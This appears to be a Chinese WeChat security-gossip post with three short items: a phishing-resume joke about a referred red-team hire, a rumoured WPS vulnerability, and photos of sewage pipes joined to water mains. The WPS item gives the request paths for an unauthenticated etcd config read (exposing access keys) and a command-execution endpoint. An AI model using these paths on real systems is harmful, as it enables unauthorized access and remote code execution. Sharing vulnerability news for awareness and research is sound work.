> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzg4NDg2NTM3NQ==&mid=2247485014&idx=1&sn=b1a1d176fc53260b695a2462ac585079

#  【吃瓜】内推"红队"当内鬼 | 网传wps漏洞为Nday | HV奖励吃大粪  
原创 LeePlus  表哥带我   2025-07-17 08:24  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/pxKqYxJWy7MHqrAcwIGH5K7UvO9SFI4EkaH4ooCVsu7cll9674CjgclKxGIKcM5MNF5s7vnK2NjZ6tliaQ0FWNg/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
## 家里养了鬼知不知道  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pxKqYxJWy7OJ6h8CtGVXoARhibeUyoDg9lKy2uTZOicNDUPeNSDcTE6OFxvPxvEMFkcWSBHbVSY0NPzx6nHNAWVw/640?wx_fmt=png&from=appmsg "")  
  
甲方："家里养了鬼知不知道？昨天早上你内推的人发了一份钓鱼简历，HR把这份钓鱼简历点开了，应急会议开到半夜，然后今天刚被你招进来的防守人员又点了钓鱼邮件，这内鬼是谁啊，不是你难道是我？？还是他啊？！！"  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pxKqYxJWy7OJ6h8CtGVXoARhibeUyoDg9f2OTSz3kLnfErBaHn8jMYCQ242wHhuBBribcgXkpDLzpjibnD9tMonzg/640?wx_fmt=png&from=appmsg "")  
  
  
## 网传WPS漏洞为Nday  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/pxKqYxJWy7OJ6h8CtGVXoARhibeUyoDg9QcWozEFPrhmNq2Syb4bJ56GpMfzfcYVRQjiccS4fUkB39icKuM7g9Bibg/640?wx_fmt=jpeg "")  
  
1、未授权访问  

```
/open/v6/api/etcd/operate?key=/config/storage&method=get

```

  
2、获取AKSK后使用脚本添加kubelet 路由映射，但需要获取TOKEN  
  
3、向对应POD发起通信后实现RCE  

```
/open/wps/run/{namespace}/{podname}/node-exporter?cmd={url_encode_command} 

```

  
![](https://mmbiz.qpic.cn/mmbiz_png/pxKqYxJWy7OJ6h8CtGVXoARhibeUyoDg94UhUDqpKzye9WP0fNHEdHQ9iaiaMrRFkUWj9X0oVxv8CByDkZbh78a3w/640?wx_fmt=png&from=appmsg "")  
  
  
## HV奖励吃大粪  
  
  
某地区排污阀接到自来水管网  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pxKqYxJWy7OJ6h8CtGVXoARhibeUyoDg9PrGEex9OzoCzeTTgXJzX19qvOqtQdQuicbZYex9CKict7yFYVjZq8wag/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pxKqYxJWy7OJ6h8CtGVXoARhibeUyoDg9yYELf9PchibEmPJ5SV0MbiavkDR7Da500g0ZMAMO0StrglcD7l0MgQicA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pxKqYxJWy7OJ6h8CtGVXoARhibeUyoDg93GNQugGB8lGfHD2RFvFH45GJ4AKmwoN9XqfhT36NhSzmZHpUDicNnbQ/640?wx_fmt=png&from=appmsg "")  
  
提醒:本文仅供  
娱乐、安全研究  
如有雷同纯属巧合  
  
  
往期推荐  
  
  
  
[【吃瓜】微信惊现逆天Xss](https://mp.weixin.qq.com/s?__biz=Mzg4NDg2NTM3NQ==&mid=2247484955&idx=1&sn=6ab81a2fb259c19f864e694b22133c18&scene=21#wechat_redirect)  
  
  
[【吃瓜】如何看待hvv睡觉被退场](https://mp.weixin.qq.com/s?__biz=Mzg4NDg2NTM3NQ==&mid=2247484844&idx=1&sn=b21845d0ac0fe737a5194542fab0dd09&scene=21#wechat_redirect)  
  
  
[【吃瓜】微信逆天的Bug2.0 神代码合集](https://mp.weixin.qq.com/s?__biz=Mzg4NDg2NTM3NQ==&mid=2247484994&idx=1&sn=a95aa7f0cd2cb5214bb842f7fdd4e2a3&scene=21#wechat_redirect)  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/pxKqYxJWy7NibiavMhpjsxcYQ80mFzicSv5Nia84ibfF6Nm33h6yqRvZpwibN3o1ZWnwh9XE4IWt1fiblrGibd6ap7qgWA/640?wx_fmt=jpeg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp "")  
  
**扫码关注我们**  
  
    微信公众号：表哥带我  
  
    本文供稿：  
LeePlus  
  
